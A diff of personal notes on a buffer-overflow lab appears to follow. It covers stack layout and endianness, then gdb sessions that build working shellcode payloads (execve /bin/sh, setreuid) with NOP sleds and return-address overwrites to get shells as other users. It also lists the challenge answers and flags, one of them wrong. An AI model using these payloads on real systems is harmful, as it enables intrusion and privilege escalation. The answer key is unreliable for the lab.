@@ -47,8 +47,6 @@ When a program runs on a machine, the computer runs the program as a process. Cu
 
     The program code and data stores the program executable and initialised variables.
 
-
-
 Where is dynamically allocated memory stored?
 *heap*
 
@@ -60,7 +58,6 @@ Where is information about functions(e.g. local arguments) stored?
 ![](https://i.imgur.com/YITSp30.png)
 
 A program would usually comprise of multiple functions and there needs to be a way of tracking which function has been called, and which data is passed from one function to another. The stack is a region of contiguous memory addresses and it is used to make it easy to transfer control and data between functions. The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses. The most common operations of the stack are:
-
 
 Pushing: used to add data onto the stack
 
@@ -111,7 +108,6 @@ int add(int a, int b){
 
 }
 
-
 int calc(int a, int b){
 
    int final = add(a, b);
@@ -120,15 +116,11 @@ int calc(int a, int b){
 
 }
 
-
 calc(4, 5)
 ```
 
-
-
 what direction does the stack grown(l for lower/h for higher)
 *l*
-
 
 what instruction is used to add data onto the stack?
 *push*
@@ -191,15 +183,12 @@ So far, this is a more thorough example of the run time stack:
 
 ![](https://i.imgur.com/vA0ug3J.png)
 
-
-
 What register stores the return address?
 *rax*
 
 ### Endianess 
 
 In the above programs, you can see that the binary information is represented in hexadecimal format. Different architectures actually represent the same hexadecimal number in different ways, and this is what is referred to as Endianess. Let’s take the value of 0x12345678 as an example. Here the least significant value is the right most value(78) while the most significant value is the left most value(12).
-
 
 Little Endian is where the value is arranged from the least significant byte to the most significant byte:
 
@@ -263,10 +252,7 @@ even though the stack grows downwards, when data is copied/written into the buff
 
 ![](https://lh5.googleusercontent.com/dJUUDKVA7jhFiDZXzIMV8Esy1hgjiM5l8BOgJT3iz91gAP0P3vqY2HemDm5s8nw8KkCumN7IWdM1X3pJ_256OEqMc_kYwZD_iDk5NaAIceAHsPR6mcw2CtGgA0u6V_00hD6tWmGK)
 
-
 Try run the C program in this folder to overwrite the above variable!
-
-
 
 What is the minimum number of characters needed to overwrite the variable?
 
@@ -337,7 +323,6 @@ Similar to the example above, data is read into a buffer using the gets function
 
 Keep in mind that the architecture of this machine is little endian!
 
-
 Invoke the special function()
 check the memory address of the function!
 
@@ -366,12 +351,10 @@ AAAAAAAAAAAAAAA
 Program received signal SIGSEGV, Segmentation fault.
 0x0000000000400041 in ?? ()
 
-
 or
 We then run this set command, which sets gdb to use the environment to use the absolute path of any executables we run: AKA it means any exploit you make inside gdb will work outside of gdb after doing that.
 
 set exec-wrapper env -u LINES -u COLUMNS
-
 
 [user1@ip-10-10-69-210 overflow-2]$ gdb func-pointer
 GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
@@ -408,7 +391,6 @@ Program received signal SIGSEGV, Segmentation fault.
 
 Inputting 15 "A"s causes the rightmost character in the return address to be a "41" (the hexcode for 'A').  This means we have successfully started overwriting the return address!  We must then check how much space we have in the return address to overwrite:
 
-
 (gdb) run
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -418,7 +400,6 @@ AAAAAAAAAAAAAAAAAAAA
 Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 
-
 (gdb) run
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
@@ -427,7 +408,6 @@ AAAAAAAAAAAAAAAAAAAAA
 
 Program received signal SIGSEGV, Segmentation fault.
 0x00000000004005da in main ()
-
 
 As we can see, sending an input of 20 "A"s overwrites the return address with all "41"s (the hex conversion of 'A').  Meaning, we have successfully overwritten the return address! In the next one, overwriting it with 21 "A"s causes the return address to no longer be overwritten and redirect somewhere else, meaning we went too far!  That means we then have 6 bytes with which to overwrite the return address (20-14=6).
 
@@ -490,7 +470,6 @@ so let's add it return address
 this is the special function
 you did this, friend!
 
-
 ```
 
 ### Buffer Overflows 
@@ -545,11 +524,9 @@ Here's a program that echo's out your input
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Segmentation fault
 
-
 [user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 + '\xef\xbe\xad\xde'")
 Here's a program that echo's out your input
 ������������������������������H�/bin/shH�H�QH�<$H1Ұ;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
-
 
 so let's go
 
@@ -597,7 +574,6 @@ https://www.binaryhexconverter.com/hex-to-ascii-text-converter
 
 With a 158 bytes length payload, we are overwritting 6 bytes of the return address. As a result, the offset will be 152 bytes.
 
-
 shellcode (40 bytes) that works here: https://www.arsouyes.org/blog/2019/54_Shellcode/
 
 >>> shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
@@ -620,7 +596,6 @@ anyways
 >>> payload = '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6
 >>> len(payload)
 158
-
 
 (gdb) run $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6")
 The program being debugged has been started already.
@@ -656,7 +631,6 @@ Argument required (starting display address).
 0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
 0x7fffffffe338: 0xc3f0b440      0xc6a53754      0x00400450      0x00000000
 
-
 0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode
 
 so before this one will be NOP sled final
@@ -671,7 +645,6 @@ so before this one will be NOP sled final
 0x7fffffffe288: 0x90909090  0x90909090  0x90909090  0x90909090
 0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode
 
-
 Let’s take any address between the NOP sled and the shellcode (e.g. 0x7fffffffe288). Here is the final payload:
 
 \x88\xe2\xff\xff\xff\x7f
@@ -679,7 +652,6 @@ Let’s take any address between the NOP sled and the shellcode (e.g. 0x7fffffff
 so final payload will be
 
 ./buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f'")
-
 
 ---Type <return> to continue, or q <return> to quit---q
 Quit
@@ -715,7 +687,6 @@ sudo apt install python3-pwntools
 [user1@ip-10-10-2-237 ~]$ grep user2 /etc/passwd
 user2:x:1002:1002::/home/user2:/bin/bash
 
-
 ┌──(kali㉿kali)-[~/bufferoverflow/learn]
 └─$ pwn shellcraft -f d amd64.linux.setreuid 1002
 [*] Checking for new versions of pwntools
@@ -728,7 +699,6 @@ user2:x:1002:1002::/home/user2:/bin/bash
 
 >>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
 14
-
 
 Our payload now looks like this:
 
@@ -749,11 +719,7 @@ omgyoudidthissocool!!
 
 it works 😊 
 
-
-
 ```
-
-![[Pasted image 20221017184228.png]]
 
 Use the above method to open a shell and read the contents of the secret.txt file.
 *omgyoudidthissocool!!*
@@ -761,8 +727,6 @@ Use the above method to open a shell and read the contents of the secret.txt fil
 ### Buffer Overflow 2 
 
 Look at the overflow-4 folder. Try to use your newly learnt buffer overflow techniques for this binary file.
-
-
 
 ```
 sh-4.2$ exit
@@ -805,10 +769,8 @@ int main(int argc, char **argv)
     copy_arg(argv[1]);
 }
 
-
 let's do it again!
 yep it's quite similar
-
 
 [user1@ip-10-10-2-237 overflow-4]$ ls
 buffer-overflow-2  buffer-overflow-2.c  secret.txt
@@ -816,7 +778,6 @@ buffer-overflow-2  buffer-overflow-2.c  secret.txt
 new word is doggohi
 [user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 OFF
 new word is doggoOFF
-
 
 but this time doggo is add it so need to remove it
 
@@ -827,7 +788,6 @@ Segmentation fault
 offset
 
 The buffer is 154 bytes, but the string doggo (5 characters) is added. So we should begin to test from 154-5. Let’s start with 8 more bytes: 
-
 
 [user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
 GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
@@ -854,7 +814,6 @@ Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_
 
 Program received signal SIGSEGV, Segmentation fault.
 0x00007ffff7abfe67 in __strcat_sse2_unaligned () from /lib64/libc.so.6
-
 
 Not enough to overwrite the return address. Let’s add 8 more bytes: 
 
@@ -907,7 +866,6 @@ user3:x:1003:1003::/home/user3:/bin/bash
 >>> len(shellcode)
 54
 
-
 Return address
 
 Now, let’s have a look at our payload. It should look like this:
@@ -921,9 +879,7 @@ total length = 90 + 54 + 19 + 6 = 169
 >>> len(payload)
 169
 
-
 now NOP sled
-
 
 [user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
 GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
@@ -1005,7 +961,6 @@ Now, memory address: (revert taking 78 e2 ff ff ff ff 7f then adding \x to get h
 
 \x78\xe2\xff\xff\xff\x7f
 
-
 [user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f'")
 new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������������x����
 sh-4.2$ whoami
@@ -1018,6 +973,5 @@ yep finally do it!
 ```
 Use the same method to read the contents of the secret file!
 *wowanothertime!!*
-
 
 [[Phishing Emails 4]]
